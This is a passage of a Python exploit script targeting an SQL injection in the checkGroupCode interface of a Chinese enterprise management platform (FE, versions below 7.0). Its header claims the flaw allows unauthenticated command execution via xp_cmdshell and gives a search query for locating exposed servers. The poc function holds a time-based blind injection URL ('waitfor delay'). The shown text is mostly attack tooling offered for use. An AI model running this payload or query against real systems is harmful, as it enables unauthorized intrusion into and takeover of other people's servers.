...
#飞企互联-FE企业运营管理平台 checkGroupCode、eficientCodewidget39、ajax codewidget39等接口存在SQL注入漏洞，未经授权攻击者通过利用SQL注入漏洞配合数据库xp cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
#version < 7.0
#app="FE-协作平台" FQHLFE_checkGroupCode_sql.py
 ...
 ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒   ░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▓░▒ ▒   ░▀▀▒ 
  ...
  ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░       ░   ░ ░ ░ ░ ░ ▒    ░   ░      ░ 
      ░  ░                       ░  ░░ ░      ░  ░               ░     ░ ░      ░     ░    
                                    author:           🐖sawa🐇
                                    version:          1.0.0
                                    For:              飞企互联-FE企业运营管理平台 checkGroupCode接口SQL注入漏洞░                                                     
"""
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description="this is a 飞企互联-FE企业运营管理平台 checkGroupCode接口SQL注入漏洞")
...
def poc(target):
    payload_url = "/docexchangeManage/checkGroupCode.js%70?code=1';waitfor+delay+'0:0:5'--"
